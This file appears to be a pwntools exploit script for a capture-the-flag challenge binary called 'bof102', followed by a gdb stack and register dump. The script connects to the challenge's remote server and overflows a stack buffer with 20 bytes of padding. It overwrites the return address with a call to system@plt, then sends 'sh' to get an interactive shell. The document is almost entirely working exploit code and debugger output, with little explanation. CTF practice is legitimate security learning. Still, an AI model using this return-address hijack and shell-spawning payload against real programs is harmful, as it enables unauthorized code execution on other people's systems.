from pwn import *

elf = ELF('./bof102')
# io = process('./bof102')
# io = gdb.debug('./bof102', """
#     b bofme
#     continue
# """)
io = remote('bof102.sstf.site', '1337')
context.gdbinit = "~/.gdbinit"
context.binary = elf

offset = 20
system = 0x08048603

payload = b'A' * offset + pack(system) + pack(0x804a06c)

io.sendline(b' sh')
io.sendline(payload)

io.interactive()

"""
ECX: 0xf7f4b9b4 --> 0x0 
EDX: 0x1 
ESI: 0xffd99d24 --> 0xffd9b3d8 ("./bof102")
EDI: 0xf7f97b80 --> 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffd99c64 --> 0x8048603 (<main+8>:        call   0x8048430 <system@plt>)
EIP: 0x80485fa (<bofme+143>:    ret)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485f5 <bofme+138>:       add    esp,0x4
   0x80485f8 <bofme+141>:       nop
   0x80485f9 <bofme+142>:       leave  
=> 0x80485fa <bofme+143>:       ret    
   0x80485fb <main>:    push   ebp
   0x80485fc <main+1>:  mov    ebp,esp
   0x80485fe <main+3>:  push   0x8048730
   0x8048603 <main+8>:  call   0x8048430 <system@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffd99c64 --> 0x8048603 (<main+8>:       call   0x8048430 <system@plt>)
0004| 0xffd99c68 ("/bin/sh")
0008| 0xffd99c6c --> 0x68732f ('/sh')
0012| 0xffd99c70 --> 0x0 
0016| 0xffd99c74 --> 0xffd99d24 --> 0xffd9b3d8 ("./bof102")
0020| 0xffd99c78 --> 0xffd99d2c --> 0xffd9b3e1 ("SHELL=/bin/bash")
0024| 0xffd99c7c --> 0xffd99c90 --> 0xf7f4a000 --> 0x225dac 
0028| 0xffd99c80 --> 0xf7f4a000 --> 0x225dac 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080485fa in bofme ()
"""